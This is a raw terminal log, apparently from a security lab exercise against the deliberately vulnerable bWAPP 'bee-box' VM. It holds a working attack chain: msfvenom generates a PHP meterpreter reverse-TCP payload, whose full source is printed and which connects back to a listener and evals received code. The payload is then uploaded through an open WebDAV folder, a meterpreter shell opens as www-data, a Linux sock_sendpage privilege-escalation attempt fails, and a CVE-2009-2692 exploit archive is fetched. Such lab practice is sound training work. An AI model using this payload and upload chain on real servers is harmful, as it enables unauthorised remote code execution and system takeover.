@@ -1,0 +1,2085 @@
+Script started on 2020-08-18 18:35:33+05:30 [TERM="xterm-256color" TTY="/dev/pts/9" COLUMNS="135" LINES="36"]
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ msq[Kfconsole -q
+-----------------------------------------------------------------------------------
+The pg and/or activerecord gem version has changed, meaning deprecated pg constants
+may no longer be in use, so try deleting this file to see if the
+'The PGconn, PGresult, and PGError constants are deprecated...' message has gone:
+/usr/share/metasploit-framework/lib/pg/deprecated_constants.rb
+-----------------------------------------------------------------------------------
+
+[1m[34m[*][0m Starting persistent handler(s)...
+[?1034h[4mmsf5[0m [0m> [H[2J[4mmsf5[0m [0m> info payload/php/
+info payload/php/bind_perl                       info payload/php/meterpreter/bind_tcp_ipv6_uuid
+info payload/php/bind_perl_ipv6                  info payload/php/meterpreter/bind_tcp_uuid
+info payload/php/bind_php                        info payload/php/meterpreter/reverse_tcp
+info payload/php/bind_php_ipv6                   info payload/php/meterpreter/reverse_tcp_uuid
+info payload/php/download_exec                   info payload/php/meterpreter_reverse_tcp
+info payload/php/exec                            info payload/php/reverse_perl
+info payload/php/meterpreter/bind_tcp            info payload/php/reverse_php
+info payload/php/meterpreter/bind_tcp_ipv6       info payload/php/shell_findsock
+[4mmsf5[0m [0m> info payload/php/,e[K[Kmeterpreter
+info payload/php/meterpreter/bind_tcp            info payload/php/meterpreter/reverse_tcp
+info payload/php/meterpreter/bind_tcp_ipv6       info payload/php/meterpreter/reverse_tcp_uuid
+info payload/php/meterpreter/bind_tcp_ipv6_uuid  info payload/php/meterpreter_reverse_tcp
+info payload/php/meterpreter/bind_tcp_uuid       
+[4mmsf5[0m [0m> info payload/php/meterpreter/
+info payload/php/meterpreter/bind_tcp            info payload/php/meterpreter/bind_tcp_uuid
+info payload/php/meterpreter/bind_tcp_ipv6       info payload/php/meterpreter/reverse_tcp
+info payload/php/meterpreter/bind_tcp_ipv6_uuid  info payload/php/meterpreter/reverse_tcp_uuid
+[4mmsf5[0m [0m> info payload/php/meterpreter/reverse_tcp
+info payload/php/meterpreter/reverse_tcp       info payload/php/meterpreter/reverse_tcp_uuid
+[4mmsf5[0m [0m> info payload/php/meterpreter/reverse_tcpInterrupt: use the 'exit' command to quit
+[4mmsf5[0m [0m> [0m]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ msfvenom -p payload/php/meterpreter/reverse_tcp[C[C[C[C[C[C[C[C[C[C[C[C[1Payload/php/meterpreter/reverse_tcp[1Pyload/php/meterpreter/reverse_tcp[1Pload/php/meterpreter/reverse_tcp[1Poad/php/meterpreter/reverse_tcp[1Pad/php/meterpreter/reverse_tcp[1Pd/php/meterpreter/reverse_tcp[1P/php/meterpreter/reverse_tcp[1Pphp/meterpreter/reverse_tcp[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C LHOST=10.10.10.10.[K LPORT=4444 -f raw -o pay load[K[K[K[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[Krev erse_tcp_payload.php
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder specified, outputting raw payload
+Payload size: 1112 bytes
+Saved as: reverse_tcp_payload.php
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ ess[K[K[Kless reverse_tcp_payload.php 
+[?1049h[22;0;0t[?1h=/*<?php /**/ error_reporting(0); $ip = '10.10.10.10'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tc p://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream';  } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $por t); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_typ e) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("N len", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b));  break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type;  if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypas s(); } else { eval($b); } die();
+[7mreverse_tcp_payload.php (END)[27m[K[K[?1l>[?1049l[23;0;0t]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ cav[K
+cabal                cache_metadata_size  cadaver              caller               captype              catchsegv
+cabextract           cachepic             cal                  cancel               cardos-tool          catman
+cache_check          cache_repair         calc_stat            capinfos             caribou-preferences  
+cache_dump           cache_restore        calc_tickadj         capsh                case                 
+cachedump            cache_writeback      calendar             captoinfo            cat                  
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ cadaver [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ cadaver http://10.10.10.6/[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[K[Khttps://10.10.10.6/webdav/
+WARNING: Untrusted server certificate presented for `bee-box.bwapp.local':
+Certificate was issued to hostname `bee-box.bwapp.local' rather than `10.10.10.6'
+This connection could have been intercepted.
+Issued to: IT, MME, Menen, Flanders, BE
+Issued by: IT, MME, Menen, Flanders, BE
+Certificate is valid from Sun, 14 Apr 2013 18:11:32 GMT to Fri, 13 Apr 2018 18:11:32 GMT
+Do you wish to accept the certificate? (y/n) y
+dav:/webdav/> put ./
+01.session                                        01.session.script
+01.session.data                                   reverse_tcp_payload.php
+01.session.properties                             terminal-log_Tue_18_Aug_2020_06:35:33_PM_IST.dmp
+dav:/webdav/> put ./reverse_tcp_payload.php [H[2Jdav:/webdav/> put ./reverse_tcp_payload.php 
+Uploading ./reverse_tcp_payload.php to `/webdav/reverse_tcp_payload.php':
+Progress: [                              ]   0.0% of 1112 bytesProgress: [=============================>] 100.0% of 1112 bytes succeeded.
+dav:/webdav/> ^CTerminated by signal 2.
+Connection to `10.10.10.6' closed.
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ cadaver https://10.10.10.6/webdav/
+WARNING: Untrusted server certificate presented for `bee-box.bwapp.local':
+Certificate was issued to hostname `bee-box.bwapp.local' rather than `10.10.10.6'
+This connection could have been intercepted.
+Issued to: IT, MME, Menen, Flanders, BE
+Issued by: IT, MME, Menen, Flanders, BE
+Certificate is valid from Sun, 14 Apr 2013 18:11:32 GMT to Fri, 13 Apr 2018 18:11:32 GMT
+Do you wish to accept the certificate? (y/n) y
+dav:/webdav/> help
+Available commands: 
+ ls         cd         pwd        put        get        mget       mput       
+ edit       less       mkcol      cat        delete     rmcol      copy       
+ move       lock       unlock     discover   steal      showlocks  version    
+ checkin    checkout   uncheckout history    label      propnames  chexec     
+ propget    propdel    propset    search     set        open       close      
+ echo       quit       unset      lcd        lls        lpwd       logout     
+ help       describe   about      
+Aliases: rm=delete, mkdir=mkcol, mv=move, cp=copy, more=less, quit=exit=bye
+dav:/webdav/> ls
+Listing collection `/webdav/': succeeded.
+        Iron_Man.pdf                      543803  Nov  3  2014
+        Terminator_Salvation.pdf          462949  Nov  3  2014
+        The_Amazing_Spider-Man.pdf        544600  Nov  3  2014
+        The_Cabin_in_the_Woods.pdf        526187  Nov  3  2014
+        The_Dark_Knight_Rises.pdf         756522  Nov  3  2014
+        The_Incredible_Hulk.pdf           618117  Nov  3  2014
+        bWAPP_intro.pdf                  5010042  Nov  3  2014
+        backdoor.php                         136  Aug 18 16:50
+        msf_http_put_test.txt                 13  Aug 18 17:05
+        nc_traffic                           690  Aug 18 03:03
+        payload.php                         3024  Aug 18 18:12
+        payload2.php                        1112  Aug 18 18:29
+        qwerty.php                           162  Aug 18 16:47
+        reverse_tcp_payload.php             1112  Aug 18 18:38
+dav:/webdav/> ^CTerminated by signal 2.
+Connection to `10.10.10.6' closed.
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ msfconsole -q 
+-----------------------------------------------------------------------------------
+The pg and/or activerecord gem version has changed, meaning deprecated pg constants
+may no longer be in use, so try deleting this file to see if the
+'The PGconn, PGresult, and PGError constants are deprecated...' message has gone:
+/usr/share/metasploit-framework/lib/pg/deprecated_constants.rb
+-----------------------------------------------------------------------------------
+
+[1m[34m[*][0m Starting persistent handler(s)...
+[?1034h[4mmsf5[0m [0m> [H[2J[4mmsf5[0m [0m> use exploit/multi/handler 
+[0m[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> ho[K[Kshi[Kow options 
+[0m
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> set payload  phpphp///m[K[K[Kmeterpreter/reverse_tcp
+[0mpayload => php/meterpreter/reverse_tcp
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> show options 
+[0m
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> set LHOST 10.10.10.10
+[0mLHOST => 10.10.10.10
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> show options 
+[0m
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.10.10      yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> exploit 
+[0m
+[1m[34m[*][0m Started reverse TCP handler on 10.10.10.10:4444 
+[1m[34m[*][0m Sending stage (38288 bytes) to 10.10.10.6
+[1m[34m[*][0m Meterpreter session 1 opened (10.10.10.10:4444 -> 10.10.10.6:46897) at 2020-08-18 18:39:21 +0530
+[0m
+[0m[4mmeterpreter[0m > shell 
+[0mProcess 16156 created.
+Channel 0 created.
+ehoami      ehoami      whoami
+www-data
+^C
+Terminate channel 0? [y/N]  y
+[4mmeterpreter[0m > [H[2J[4mmeterpreter[0m > bg
+[0m[1m[34m[*][0m Backgrounding session 1...
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> sessions 
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                   Information              Connection
+  --  ----  ----                   -----------              ----------
+  1         meterpreter php/linux  www-data (33) @ bee-box  10.10.10.10:4444 -> 10.10.10.6:46897 (10.10.10.6)
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> search sendpage
+[0m
+Matching Modules
+================
+
+   #  Name                               Disclosure Date  Rank   Check  Description
+   -  ----                               ---------------  ----   -----  -----------
+   0  exploit/linux/local/sock_[45msendpage[0m  2009-08-13       [32mgreat[0m  Yes    Linux Kernel [45mSendpage[0m Local Privilege Escalation
+
+
+[4mmsf5[0m exploit([1m[31mmulti/handler[0m) [0m> use exploit/linux/local/sock_sendpage
+[0m[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> ll
+[0m^L[1m[31m[-][0m Unknown command: ll.
+[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> show options 
+[0m
+Module options (exploit/linux/local/sock_sendpage):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   DEBUG_EXPLOIT  false            yes       Make the exploit executable be verbose about what it's doing
+   SESSION                         yes       The session to run this module on.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux x86
+
+
+[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> sessions -i 
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                   Information              Connection
+  --  ----  ----                   -----------              ----------
+  1         meterpreter php/linux  www-data (33) @ bee-box  10.10.10.10:4444 -> 10.10.10.6:46897 (10.10.10.6)
+
+[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> sessions -i  1
+[0m[1m[34m[*][0m Starting interaction with 1...
+
+[4mmeterpreter[0m > ;[Kshell 
+[0mProcess 16180 created.
+Channel 1 created.
+uname -a
+Linux bee-box 2.6.24-16-generic #1 SMP Thu Apr 10 13:23:42 UTC 2008 i686 GNU/Linux
+^[[A    uname -p
+unknown
+^C
+Terminate channel 1? [y/N]  y
+[4mmeterpreter[0m > bg
+[0m[1m[34m[*][0m Backgrounding session 1...
+[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> bgshell essions -i  1[Khow options ll[Kuse exploit/linux/local/sock_sendpage[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[Psearch sendpageuse exploit/linux/local/sock_sendpage[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[P[Psearch sendpage[P[P[P[P[P[Pssions bg[Kshell exploit show options et LHOST 10.10.10.10[P[P[P[P[P[P[P[Phow options et payload php/meterpreter/reverse_tcphow options [Ket payload php/meterpreter/reverse_tcphow options [Kuse exploit/multi/handler exploit [Kuse exploit/multi/handler [P[P[P[P[P[P[P[P[P[P[P[P[Pshow options[Cet payload php/meterpreter/reverse_tcphow options [Ket LHOST 10.10.10.10[P[P[P[P[P[P[P[Phow options [P[P[P[P[Pexploit[C[P[Pshell[C[P[P[P[Pbgsessions arch sendpageuse exploit/linux/local/sock_sendpagell[Kshow options [Pessions -i[C 1[P[P[P[P[P[P[P[Phell [P[P[P[Pbg[K[H[2J[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> show options 
+[0m
+Module options (exploit/linux/local/sock_sendpage):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   DEBUG_EXPLOIT  false            yes       Make the exploit executable be verbose about what it's doing
+   SESSION                         yes       The session to run this module on.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux x86
+
+
+[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> ser s[K[K[Kt session 1
+[0msession => 1
+[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> show options 
+[0m
+Module options (exploit/linux/local/sock_sendpage):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   DEBUG_EXPLOIT  false            yes       Make the exploit executable be verbose about what it's doing
+   SESSION        1                yes       The session to run this module on.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux x86
+
+
+[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> set SE[K[KDEBUG_EXPLOIT true 
+[0mDEBUG_EXPLOIT => true
+[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> [H[2J[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> show options 
+[0m
+Module options (exploit/linux/local/sock_sendpage):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   DEBUG_EXPLOIT  true             yes       Make the exploit executable be verbose about what it's doing
+   SESSION        1                yes       The session to run this module on.
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Linux x86
+
+
+[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> exploit 
+[0m
+[1m[33m[!][0m SESSION may not be compatible with this module.
+[1m[34m[*][0m Started reverse TCP handler on 10.10.10.10:4444 
+[1m[31m[-][0m Exploit aborted due to failure: not-vulnerable: Target is not vulnerable. Set ForceExploit to override.
+[1m[34m[*][0m Exploit completed, but no session was created.
+[4mmsf5[0m exploit([1m[31mlinux/local/sock_sendpage[0m) [0m> 
+[1]+  Stopped                 msfconsole -q
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ wget Thanks to David Bloom (@philophobia78) for detecting the vulnerability!^C
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ we[Kh[Kget https://10.10.10.6/evil/cve-2009-2692.tar
+--2020-08-18 18:43:56--  https://10.10.10.6/evil/cve-2009-2692.tar
+Connecting to 10.10.10.6:443... connected.
+ERROR: The certificate of ‘10.10.10.6’ is not trusted.
+ERROR: The certificate of ‘10.10.10.6’ doesn't have a known issuer.
+ERROR: The certificate of ‘10.10.10.6’ has expired.
+The certificate has expired
+The certificate's owner does not match hostname ‘10.10.10.6’
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ ll
+total 116
+-rw-r--r-- 1 dinesh dinesh   184 Aug 17 17:48 01.session
+-rw-r--r-- 1 dinesh dinesh 65536 Aug 17 17:49 01.session.data
+-rw-r--r-- 1 dinesh dinesh    99 Aug 17 17:49 01.session.properties
+-rw-r--r-- 1 dinesh dinesh  6946 Aug 17 17:49 01.session.script
+-rw-r--r-- 1 dinesh dinesh  1112 Aug 18 18:37 reverse_tcp_payload.php
+-rw-r--r-- 1 dinesh dinesh 24576 Aug 18 18:43 terminal-log_Tue_18_Aug_2020_06:35:33_PM_IST.dmp
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ l[Kcurl -sS:[KL https://10.10.10.6/evil/cve-2009-2692.tar > cve.tar
+curl: (35) error:1425F102:SSL routines:ssl_choose_client_version:unsupported protocol
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ ;;
+bash: syntax error near unexpected token `;;'
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ ll
+total 116
+-rw-r--r-- 1 dinesh dinesh   184 Aug 17 17:48 01.session
+-rw-r--r-- 1 dinesh dinesh 65536 Aug 17 17:49 01.session.data
+-rw-r--r-- 1 dinesh dinesh    99 Aug 17 17:49 01.session.properties
+-rw-r--r-- 1 dinesh dinesh  6946 Aug 17 17:49 01.session.script
+-rw-r--r-- 1 dinesh dinesh     0 Aug 18 18:44 [0m[01;31mcve.tar[0m
+-rw-r--r-- 1 dinesh dinesh  1112 Aug 18 18:37 reverse_tcp_payload.php
+-rw-r--r-- 1 dinesh dinesh 24576 Aug 18 18:43 terminal-log_Tue_18_Aug_2020_06:35:33_PM_IST.dmp
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ rm v[Kcve.tar 
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ cp ~/Documents/[K[K[K[K[K[K[K[K[Kw[Koe[Kwnloads/cve-2009-2692.tar .
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ [H[2J]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ ll
+total 140
+-rw-r--r-- 1 dinesh dinesh   184 Aug 17 17:48 01.session
+-rw-r--r-- 1 dinesh dinesh 65536 Aug 17 17:49 01.session.data
+-rw-r--r-- 1 dinesh dinesh    99 Aug 17 17:49 01.session.properties
+-rw-r--r-- 1 dinesh dinesh  6946 Aug 17 17:49 01.session.script
+-rw-r--r-- 1 dinesh dinesh 20480 Aug 18 18:45 [0m[01;31mcve-2009-2692.tar[0m
+-rw-r--r-- 1 dinesh dinesh  1112 Aug 18 18:37 reverse_tcp_payload.php
+-rw-r--r-- 1 dinesh dinesh 28672 Aug 18 18:44 terminal-log_Tue_18_Aug_2020_06:35:33_PM_IST.dmp
+]0;dinesh@evil: ~/Documents/work/workspaces/git_temp_projs/bWAPP_sessions/zaproxy/bwapp/Security_Misconfiguration/Local_Privilege_Escalation-sendpage[01;31mdinesh@evil[00m: [[01;34mLocal_Privilege_Escalation-sendpage[00m] $ tar xf cve-2009-2692.tar 
